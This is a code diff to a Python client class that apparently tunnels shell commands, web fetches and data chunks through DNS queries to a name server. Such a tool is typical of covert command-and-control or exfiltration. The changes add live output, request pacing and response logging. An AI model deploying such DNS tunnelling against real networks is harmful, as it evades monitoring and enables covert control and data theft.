@@ -9,23 +9,27 @@ from threading import Thread
 from time import sleep
 from client_state import ClientState, ClientStateRequestHandler, ClientStateResponseHandler, ClientStateReader, \
     StateEnum
+from live_output import RichOutput
 from typing import Optional
 
 
 class Communicator:
 
     def __init__(self, client_state: ClientState, domain: str, name_server: str, client_id: Optional[int] = None,
-                 request_lag_seconds: int = 1):
+                 request_lag_seconds: int = 1, live_output: bool = False):
         self._name_server = name_server
         self._response_handler = ClientStateResponseHandler(client_state)
         self._request_handler = ClientStateRequestHandler(client_state, domain)
         self._state_reader = ClientStateReader(client_state)
         self._request_lag_seconds = request_lag_seconds
 
+        if live_output:
+            RichOutput(client_state=client_state)
+
         self.__is_id_set = False
 
         if client_id:
-            self._response_handler.client_id(client_id=client_id)
+            self._response_handler.client_id(client_id_or_ip=client_id)
             self.__is_id_set = True
 
     @property
@@ -37,7 +41,7 @@ class Communicator:
         response = dns.query.udp(query, self._name_server)
         r_type, [data] = self.unpack_response(response)
 
-        self._response_handler.client_id(client_id=int(data[data.rindex(b'.') + 1:]))
+        self._response_handler.client_id(client_id_or_ip=data)
 
         self.__is_id_set = True
 
@@ -67,7 +71,7 @@ class Communicator:
                 elif self._state_reader.read_state() == StateEnum.RECEIVING_SHELL:
                     return self._response_handler.command(b"", done=True)
                 else:
-                    return "NOTHING TO DO"
+                    return self._response_handler.nothing(data[0])
 
     def curl(self, webpage: str) -> str:
         query, done = self._request_handler.curl(webpage)
@@ -79,6 +83,7 @@ class Communicator:
         _, data = self.unpack_response(response)
 
         while data[0] != b"NOTHING":
+            sleep(self._request_lag_seconds)
             self._response_handler.data(data[1], done=False)
             query = self._request_handler.continue_request()
             response = dns.query.udp(query, self._name_server)
@@ -92,7 +97,8 @@ class Communicator:
     def data(self, head: str, body: str) -> str:
         # send head
         query, done = self._request_handler.data(head, True)
-        dns.query.udp(query, self._name_server)
+        response = dns.query.udp(query, self._name_server)
+        self._response_handler.add_response(self.unpack_response(response)[1][0])
 
         if not done:
             self._continue_last_request()
@@ -102,6 +108,7 @@ class Communicator:
             sleep(self._request_lag_seconds)
         query, done = self._request_handler.data(body, False)
         response = dns.query.udp(query, self._name_server)
+        self._response_handler.add_response(self.unpack_response(response)[1][0])
 
         if not done:
             response = self._continue_last_request()
@@ -143,6 +150,7 @@ class Communicator:
                 sleep(self._request_lag_seconds)
             query, done = self._request_handler.continue_last_request()
             response = dns.query.udp(query, self._name_server)
+            self._response_handler.add_response(self.unpack_response(response)[1][0])
 
         return response
 
